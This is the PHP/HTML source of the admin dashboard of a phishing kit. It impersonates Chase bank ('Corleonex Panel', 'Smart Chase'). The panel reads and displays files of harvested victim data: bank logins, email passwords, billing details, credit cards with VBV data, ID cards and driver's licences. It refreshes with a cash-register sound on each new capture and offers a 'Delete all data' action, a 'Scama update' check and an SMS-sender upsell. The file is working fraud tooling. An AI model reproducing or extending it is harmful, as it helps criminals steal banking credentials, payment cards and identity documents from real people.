<?php
session_start();
error_reporting(0);
header("Content-Type: text/html; charset=UTF-8");
#################### *-* Start Include *-* ####################
/**
 * CHASE -
 * version 1.0
 * telegram = @Corleonex


   _____           _                            
  / ____|         | |                           
 | |     ___  _ __| | ___  ___  _ __   _____  __
 | |    / _ \| '__| |/ _ \/ _ \| '_ \ / _ \ \/ /
 | |___| (_) | |  | |  __/ (_) | | | |  __/>  < 
  \_____\___/|_|  |_|\___|\___/|_| |_|\___/_/\_\
                                                
                                                
" There's no nobility in poverty.
  I've been a poor man,
  and I've been a rich man.
   And I choose rich every fucking time. "

**/

if (!isset($_SESSION['UserData'])) {

    if (isset($_GET['id'])) {
     $id = isset($_GET['id']) ? trim(htmlentities($_GET['id'])):'';
      if ($id !== 'Corleonex') {
        exit(header("HTTP/1.0 404 Not Found"));
      }
    }else{
        exit(header("HTTP/1.0 404 Not Found"));
    }

}


if(!isset($_SESSION['UserData']['Username'])){header("location:login.php");exit;}else{ 
  include 'YOUR-CONFIG.php'; 
}
$what = $_GET['dila'];

?>

            
<?php

$click = "../Corleonex/Boa_Result/login.txt";
$file = fopen($click, "r");
$total_login = fread($file, filesize($click));
$total_login = substr_count($total_login, "UserName");
fclose($file);
if($total_login == 0) {
    $total_login = "$total_login";
}else{
    $total_login = "$total_login";
}

$click = "../Corleonex/Boa_Result/total_login_view.txt";
$file = fopen($click, "r");
$total_login_view = fread($file, filesize($click));
$total_login_view = substr_count($total_login_view, "#>");
fclose($file);
if($total_login_view == 0) {
    $total_login_view = "$total_login_view";
}else{
    $total_login_view = "$total_login_view";
}

$click = "../Corleonex/Boa_Result/cc.txt";
$file = fopen($click, "r");
$total_cc = fread($file, filesize($click));
$total_cc = substr_count($total_cc, "Security");
fclose($file);
if($total_cc == 0) {
    $total_cc = "$total_cc";
}else{
    $total_cc = "$total_cc";
}

$click = "../Corleonex/Boa_Result/id.txt";
$file = fopen($click, "r");
$total_id = fread($file, filesize($click));
$total_id = substr_count($total_id, "ID CARD ");
fclose($file);
if($total_id == 0) {
    $total_id = "$total_id";
}else{
    $total_id = "$total_id";
}

$click = "../Corleonex/Boa_Result/total_cc_view.txt";
$file = fopen($click, "r");
$total_cc_view = fread($file, filesize($click));
$total_cc_view = substr_count($total_cc_view, "#>");
fclose($file);
if($total_cc_view == 0) {
    $total_cc_view = "$total_cc_view";
}else{
    $total_cc_view = "$total_cc_view";
}


$click = "../Corleonex/Boa_Result/access.txt"; 
$file = fopen($click, "r");
$total_email_access = fread($file, filesize($click));
$total_email_access = substr_count($total_email_access, "Password");
fclose($file);
if($total_email_access == 0) {
    $total_email_access = "$total_email_access";
}else{
    $total_email_access = "$total_email_access";
}

$click = "../Corleonex/Boa_Result/total_email_access_view.txt";
$file = fopen($click, "r");
$total_email_access_view = fread($file, filesize($click));
$total_email_access_view = substr_count($total_email_access_view, "#>");
fclose($file);
if($total_email_access_view == 0) {
    $total_email_access_view = "$total_email_access_view";
}else{
    $total_email_access_view = "$total_email_access_view";
}


$click = "../Corleonex/Boa_Result/billing.txt";
$file = fopen($click, "r");
$total_billing = fread($file, filesize($click));
$total_billing = substr_count($total_billing, "DRIVERS_LICENSE");
fclose($file);
if($total_billing == 0) {
    $total_billing = "$total_billing";
}else{
    $total_billing = "$total_billing";
}

$click = "../Corleonex/Boa_Result/total_billing_view.txt";
$file = fopen($click, "r");
$total_billing_view = fread($file, filesize($click));
$total_billing_view = substr_count($total_billing_view, "#>");
fclose($file);
if($total_billing_view == 0) {
    $total_billing_view = "$total_billing_view";
}else{
    $total_billing_view = "$total_billing_view";
}



$click = "../visit_log.txt";
$file = fopen($click, "r");
$total_view = fread($file, filesize($click));
$total_view = substr_count($total_view, "#>");
fclose($file);
if($total_view == 0) {
    $total_view = "$total_view";
}else{
    $total_view = "$total_view";
}

$click = "../bots.txt";
$file = fopen($click, "r");
$total_bots = fread($file, filesize($click));
$total_bots = substr_count($total_bots, "#>");
fclose($file);
if($total_bots == 0) {
    $total_bots = "$total_bots";
}else{
    $total_bots = "$total_bots";
}

if($what == "dellet") {
    unlink("../bots.txt");
    unlink("../Corleonex/Boa_Result/cc.txt");
    unlink("../Corleonex/Boa_Result/access.txt");
    unlink("../Corleonex/Boa_Result/login.txt");
    unlink("../Corleonex/Boa_Result/online.txt");
    unlink("../Corleonex/Boa_Result/mail.txt");
    unlink("../Corleonex/Boa_Result/billing.txt");

    unlink("../visit_log.txt"); 
    unlink("../Corleonex/Boa_Result/mail.txt");
    unlink("../Corleonex/Boa_Result/ADDRESS.txt");

    unlink("../Corleonex/Boa_Result/total_email_access_view.txt");
    unlink("../Corleonex/Boa_Result/total_cc_view.txt");
    unlink("../Corleonex/Boa_Result/total_billing_view.txt");
    unlink("../Corleonex/Boa_Result/total_login_view.txt");

    echo "<div style='color:#0c0'>You have deleted data successfully</div><br>";
}
?>
<html lang="en">
    

<head>

        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Corleonex Panel</title>

        <!-- CSS -->
        <!-- Bootstrap -->
        <!-- Ionicons -->
        <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="files/admin/css/ft.css">
        <link href="css/style.css" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css">

<script
  src="https://code.jquery.com/jquery-3.5.1.min.js"
  integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0="
  crossorigin="anonymous"></script>

    </head>
<header>
<?php include('nav.php'); ?>
    </header>
 <!-- Begin page content -->
    <main role="main" class="container">
<div class="container">
    <div class="row">
       <div style="margin-top: 30px;" class="col-sm-2">
        
         <div id="vardov" class="card-body">
  <button onclick="openModal('../visit_log.txt')" type="button" class="btn btn-info">Check Views </button>
  <button onclick="sms();" style="margin-top: 12px;" type="button" class="btn btn-success">SMS SENDER </button>
   
  </div>


        </div>

        <div id="dayabli" style="margin-top: 30px;" class="col-sm-8">

<ul id="alldata"  class="list-group list-group-flush inverted">
            <h3 id="liveresult">Live Result 

<div style="margin-left: 7px;" class="spinner-grow" role="status">
  <span class="sr-only">Loading...</span>
</div>

 </h3>
<div id="update">
  <li onclick="openModal('../Corleonex/Boa_Result/login.txt')" id="mainsec" class="list-group-item list-group-item-dark">
    <i style="margin-right: 10px;" class="far fa-eye"></i>Chase Login
    <span style="margin-left: 15px;" id="badd1" class="badge badge-primary badge-pill">0</span>
  </li>
  <li onclick="openModal('../Corleonex/Boa_Result/access.txt')" id="mainsec" class="list-group-item list-group-item-dark">
    <i style="margin-right: 10px;" class="fas fa-envelope-square"></i>Email access
    <span style="margin-left: 15px;" id="badd2" class="badge badge-primary badge-pill">0</span>
  </li>
  <li onclick="openModal('../Corleonex/Boa_Result/billing.txt')" id="mainsec" class="list-group-item list-group-item-dark">
    <i style="margin-right: 10px;" class="fas fa-info-circle"></i>Billing Details
    <span style="margin-left: 15px;" id="badd3" class="badge badge-primary badge-pill">0</span>
  </li>
  <li onclick="openModal('../Corleonex/Boa_Result/cc.txt')" id="mainsec" class="list-group-item list-group-item-dark">
    <i style="margin-right: 10px;" class="far fa-credit-card"></i>Credit Card / VBV
    <span style="margin-left: 15px;" id="badd4" class="badge badge-primary badge-pill">0</span>
  </li>
    <li onclick="openModal('../Corleonex/Boa_Result/id.txt')" id="mainsec" class="list-group-item list-group-item-dark">
    <i style="margin-right: 10px;" class="far fa-credit-card"></i>ID 
    <span style="margin-left: 15px;" id="badd5" class="badge badge-primary badge-pill">0</span>
  </li>
</div>

</ul>



<ul   class="list-group list-group-flush inverted">
            <h3 id="liveresult"> </h3>

  <div >
    <li  onclick="openModal('../Corleonex/Boa_Result/total_login_view.txt')" id="mainsec" class="list-group-item"><i style="margin-right: 10px;" class="far fa-eye"></i> Login Views 
      <span class="badge badge-primary badge-pill"><?php echo $total_login_view; ?></span>
</li>
  <li  onclick="openModal('../Corleonex/Boa_Result/total_email_access_view.txt')" id="mainsec" class="list-group-item"><i style="margin-right: 10px;" class="far fa-eye"></i>Email access Views
      <span class="badge badge-primary badge-pill"><?php echo $total_email_access_view; ?></span>
</li>
 <li  onclick="openModal('../Corleonex/Boa_Result/total_billing_view.txt')" id="mainsec" class="list-group-item"><i style="margin-right: 10px;" class="far fa-eye"></i>Billing Details Views
      <span class="badge badge-primary badge-pill"><?php echo $total_billing_view; ?></span>
</li>
  <li onclick="openModal('../Corleonex/Boa_Result/card.txt')"  id="mainsec" class="list-group-item"><i style="margin-right: 10px;" class="far fa-eye"></i> Credit / card Views 
      <span class="badge badge-primary badge-pill"><?php echo $total_cc; ?></span>
</li>





  </div>

</ul>

<a style="margin-top: 15px;" href="index.php?dila=dellet" type="button" class="btn btn-danger">Delete all data !</a>

<button onclick="checknews();"  style="margin-top: 15px;"type="button" class="btn btn-secondary">Check for Scama update </button>

<br>
<div style="margin-top: 5px;" class="news">
  
</div>
        </div>
        <div style="margin-top: 30px;" class="col-sm-2">
        
         <div id="vardov" class="card-body">
   <button  onclick="openModal('../bots.txt')" type="button" class="btn btn-info">Check bots views</button>

  
  </div>


        </div>
    </div>
</div>
    </main>
    <audio id="audio" src="files/admin/cash-register-kaching-sound-effect-hd.mp3"></audio>

    <footer class="footer">
      <div class="container">
        <span class="text-muted">Smart Chase by <a target="_blank" href="http://t.me/corleonex" >Corleonex</a>.</span>
      </div>
    </footer>



<!-- Modal -->
<div class="modal fade" id="exampleModalCenter" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
  <div class="modal-dialog modal-lg" role="document">
    <div style="    white-space: pre;      word-break: break-all;

" class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLongTitle">Data : </h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div style="  word-break: break-all;
" id="lolfaker" class="modal-body">
        <!-- put the data --> 

        <!-- data --> 
      </div>
      <div class="modal-footer">
      </div>
    </div>
  </div>
</div>

<!-- Scripts -->
        <!-- jQuery -->     

    <!-- Bootstrap -->
        <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>        
<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css
">
 <script type="text/javascript">

  function sms()

 {
    toastr.options = {
                "positionClass": "toast-bottom-right",

            }

        toastr.warning('contact me to get access to sms sender')
 }


   function play() {
        var audio = document.getElementById("audio");
        audio.play();
      }
 function checknews(){
  $.get('Corleonex.php?job=news' , function(data){

        $('.news').html(data);
         toastr.options = {
                "positionClass": "toast-bottom-right",

            }

        toastr.success('Cheking update is done ')


  });
 }
  function openModal(link){
 $('#lolfaker').html('');
     $.get(link, function(data, status){
        $('#lolfaker').html(data);
  });

    $('#exampleModalCenter').modal('show'); 


  }
function setCookie(c_name, value, exdays) {
    var exdate = new Date();
    exdate.setDate(exdate.getDate() + exdays);
    var c_value = escape(value) + ((exdays == null) ? "" : "; expires=" + exdate.toUTCString());
    document.cookie = c_name + "=" + c_value;
}

function getCookie(c_name) {
    var i, x, y, ARRcookies = document.cookie.split(";");
    for (i = 0; i < ARRcookies.length; i++) {
        x = ARRcookies[i].substr(0, ARRcookies[i].indexOf("="));
        y = ARRcookies[i].substr(ARRcookies[i].indexOf("=") + 1);
        x = x.replace(/^\s+|\s+$/g, "");
        if (x == c_name) {
            return unescape(y);
        }
    }
}// these script allow to update every 5 second ! 

$(document).ready(function()
{
     setInterval(function() {
        
        // start getting data 

     _syncdata();

     }, 5000);
});
     _syncdata();


function _syncdata(){
     $.get( "data.php", function( data ) {

            // save data as cookie


          if (data != getCookie('c_data') ) {
          
          $('#dayabli').fadeOut(500).fadeIn(500);

          play();

           toastr.options = {
                "positionClass": "toast-bottom-right",

            }

          toastr.success('Data has been updated')
          }

          setCookie('c_data' , data , 36000)


          var clean = JSON.parse(getCookie('c_data'));

          console.log(clean);
          // apppend data 

        var keys = Object.keys(clean);
  
  for(var i=0; i<keys.length; i++){
    var key = keys[i];
    console.log(key);
    if (key == 'Chase Login') {
     $( "#badd1" ).text(clean[key]);

    }
    if (key == 'Email access') {
         $( "#badd2" ).text(clean[key]);

    }
    if (key == 'Billing Details') {
         $( "#badd3" ).text(clean[key]);

    }
    if (key == 'Credit Card / VBV') {
     $( "#badd4" ).text(clean[key]);
    }
     if (key == 'ID') {
     $( "#badd5" ).text(clean[key]);
    }
  
}

        });
}


</script>

    </body>

</html> 